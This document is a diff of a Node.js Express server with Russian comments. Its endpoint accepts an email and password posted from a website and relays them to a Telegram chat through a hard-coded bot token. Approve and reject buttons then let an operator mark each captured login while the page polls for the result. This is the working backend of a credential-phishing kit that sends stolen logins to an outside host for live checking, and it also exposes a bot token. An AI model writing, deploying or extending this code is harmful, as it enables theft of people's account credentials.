@@ -2,91 +2,61 @@ const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
 
-const app = express();
+const app = express(); // ВОТ ЭТА СТРОЧКА ИСПРАВЛЯЕТ ТВОЮ ОШИБКУ 'app is not defined'
 app.use(express.json());
-app.use(cors()); // Чтобы сайт мог делать запросы к бэкенду
+app.use(cors());
 
 const token = '8529029264:AAHn2DMIIgv-Ga2Fd5G3Az86GQqp1qshNgQ';
 const chatId = '-1003894478662';
 
-// Хранилище статусов пользователей в памяти сервера
-let requests = {}; 
+let requests = {}; // Память для статусов
 
-// 1. Прием данных с сайта
+// Прием данных с сайта
 app.post('/send-data', async (req, res) => {
     try {
         const { userId, email, pass } = req.body;
         requests[userId] = 'pending';
 
-        const message = `⚠️ **Данные входа**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``;
-        
         await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
             chat_id: chatId,
-            text: message,
+            text: `⚠️ **Новые данные**\n👤 ID: \`${email}\`\n🔑 Pass: \`${pass}\``,
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
                     [
-                        { text: "✅ Верно", callback_data: `approve_${userId}` },
+                        { text: "✅ Ок", callback_data: `approve_${userId}` },
                         { text: "❌ Ошибка", callback_data: `reject_${userId}` }
                     ]
                 ]
             }
         });
-
         res.json({ status: 'sent' });
-    } catch (error) {
-        console.error(error);
-        res.status(500).json({ error: 'Ошибка отправки в ТГ' });
+    } catch (e) {
+        res.status(500).json({ error: e.message });
     }
 });
 
-// 2. Проверка статуса (сайт опрашивает это)
+// Проверка статуса сайтом
 app.get('/check-status/:userId', (req, res) => {
-    const status = requests[req.params.userId] || 'pending';
-    res.json({ status });
+    res.json({ status: requests[req.params.userId] || 'pending' });
 });
 
-// 3. Обработка нажатий кнопок (Webhook от Telegram)
+// Обработка кнопок из Телеграм
 app.post('/tg-webhook', async (req, res) => {
-    try {
-        const callbackQuery = req.body.callback_query;
-        if (callbackQuery) {
-            const data = callbackQuery.data; // Пример: "approve_user123"
-            const [action, userId] = data.split('_');
+    const callbackQuery = req.body.callback_query;
+    if (callbackQuery) {
+        const [action, userId] = callbackQuery.data.split('_');
+        requests[userId] = (action === 'approve') ? 'success' : 'error';
 
-            if (action === 'approve') {
-                requests[userId] = 'success';
-            } else if (action === 'reject') {
-                requests[userId] = 'error';
-            }
-
-            // Отвечаем Телеграму, что получили нажатие
-            await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
-                callback_query_id: callbackQuery.id,
-                text: action === 'approve' ? "Пропущено дальше" : "Отказано"
-            });
-
-            // Обновляем сообщение, чтобы убрать кнопки
-            await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
-                chat_id: chatId,
-                message_id: callbackQuery.message.message_id,
-                text: callbackQuery.message.text + (action === 'approve' ? "\n\n✅ ПРИНЯТО" : "\n\n❌ ОТКЛОНЕНО")
-            });
-        }
-    } catch (e) {
-        console.error("Ошибка в Webhook:", e);
+        await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
+            callback_query_id: callbackQuery.id,
+            text: "Статус обновлен!"
+        });
     }
     res.sendStatus(200);
 });
 
-// Запуск сервера
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 10000;
 app.listen(PORT, () => {
-    console.log(`Сервер запущен на порту ${PORT}`);
-});
-
-// Сайт вызывает это каждые 3 сек
-app.get('/check-status/:userId', (req, res) => {
-    res.send({ status: requests[req.params.userId] || 'pending' });
+    console.log(`Сервер работает на порту ${PORT}. Файл: index.js`);
 });
